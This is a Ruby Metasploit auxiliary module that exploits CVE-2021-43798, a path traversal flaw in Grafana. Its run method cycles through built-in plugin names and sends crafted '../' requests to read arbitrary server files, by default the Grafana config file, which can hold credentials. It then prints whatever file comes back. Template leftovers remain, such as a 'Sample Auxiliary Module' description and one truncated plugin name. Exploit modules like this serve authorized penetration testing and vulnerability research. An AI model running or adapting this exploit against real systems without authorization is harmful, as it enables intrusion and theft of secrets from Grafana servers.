##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Grafana Plugin Path Traversal',
        'Description' => 'Sample Auxiliary Module',
        'Author' => [
          'h00die' # msf module
        ],
        'License' => MSF_LICENSE,
        # https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability,-Side-Effects,-and-Stability
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'References' => [
          ['CVE', '2021-43798'],
          ['URL', 'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p'],
          ['URL', 'https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],
          ['EDB', '50581'],
          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798']

        ]
      )
    )
    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 13])
      ]
    )
  end

  def run
    print_status("Running the simple auxiliary module with action #{action.name}")
    [
      'alertlist',
      'annolist',
      'barchart',
      'bargauge',
      'candlestick',
      'cloudwatch',
      'dashlist',
      'elasticsearch',
      'gauge',
      'geomap',
      'gettingstarted',
      'grafana-azure-monitor-datasource',
      'graph',
      'heatmap',
      'histogram',
      'influxdb',
      'jaeger',
      'logs',
      'loki',
      'mssql',
      'mysql',
      'news',
      'nodeGraph',
      'opentsdb',
      'piechart',
      'pluginlist',
      'postgres',
      'prometheus',
      'stackdriver',
      'stat',
      'state-timeline',
      'status-histor',
      'table',
      'table-old',
      'tempo',
      'testdata',
      'text',
      'timeseries',
      'welcome',
      'zipkin'
    ].each do |plugin|
      vprint_status("Attempting plugin: #{plugin}")
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => "/public/plugins/#{plugin}/#{'../' * datastore['DEPTH']}#{datastore['FILEPATH']}"
      })
      next unless res && res.code == 200

      print_good(res.body)
      # store loot
      break
    end
  end

end
